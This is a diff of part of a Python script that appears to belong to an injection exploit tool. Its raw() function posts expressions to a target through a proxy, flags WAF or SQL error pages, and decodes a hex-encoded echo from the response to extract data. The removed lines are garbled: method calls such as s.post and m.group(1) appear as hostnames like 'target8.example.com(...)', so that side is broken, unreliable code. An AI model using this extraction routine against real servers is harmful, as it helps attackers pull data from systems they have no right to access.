@@ -121,16 +121,16 @@ def raw(expr, timeout=60):
     s.proxies = dict(PROXY)
     s.headers.update({"User-Agent": UA, "Connection": "close"})
     try:
-        r = target8.example.com("http://%s%s" % (HOST, PATH), data=data, timeout=timeout,
+        r = s.post("http://%s%s" % (HOST, PATH), data=data, timeout=timeout,
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                    allow_redirects=False)
         b = r.content.decode("utf-8", "replace")
         if len(b) > 20000:
             return None                        # WAF/SQL 错误页
         m = ECHO_RE.search(b)
-        if not m or not target22.example.com(1):
+        if not m or not m.group(1):
             return ""
-        h = target22.example.com(1)
+        h = m.group(1)
         if len(h) % 2:
             return "<odd:%s>" % h
         try:
